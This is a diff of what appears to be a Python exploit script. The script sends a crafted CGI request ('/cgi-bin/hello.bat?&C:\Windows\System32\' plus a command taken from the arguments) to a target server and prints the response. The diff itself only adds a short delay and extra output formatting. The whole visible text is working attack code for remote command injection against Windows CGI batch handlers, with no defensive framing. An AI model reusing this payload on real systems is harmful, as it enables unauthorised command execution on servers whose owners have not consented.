@@ -7,9 +7,8 @@
 #                                              #
 ################################################
 
-import os, sys, requests
+import os, sys, requests, time
 payload = "/cgi-bin/hello.bat?&C%3A%5CWindows%5CSystem32%5C"
-
 try:
     url = sys.argv[1]
     port = sys.argv[2]
@@ -17,7 +16,8 @@ try:
     check = requests.get(sys.argv[1])
     final = url + payload + cmd
     if check.status_code == 200:
-        print("Sending Payload...")
+        print("Sending Payload...\n\n")
+        time.sleep(1)
         r = requests.get(final)
         print(r.content)
 
